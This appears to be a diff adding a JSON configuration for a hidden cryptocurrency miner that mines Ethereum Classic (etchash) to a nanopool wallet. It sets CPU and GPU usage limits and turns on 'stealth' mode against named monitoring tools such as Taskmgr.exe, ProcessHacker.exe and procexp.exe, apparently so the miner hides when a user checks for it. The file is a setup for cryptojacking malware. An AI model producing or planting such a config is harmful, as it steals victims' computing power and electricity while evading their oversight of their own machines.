@@ -1,0 +1,10 @@
+{
+    "url": "stratum://0xE358Eeed0DD50eA23d763963F84d217048c956E7.Worker@etc-eu2.nanopool.org:19999",
+    "algo": "etchash",
+    "max-gpu": 50,
+    "max-cpu": 100,
+    "idle-wait": 1,
+    "idle-gpu": 100,
+    "stealth": true,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"
+}
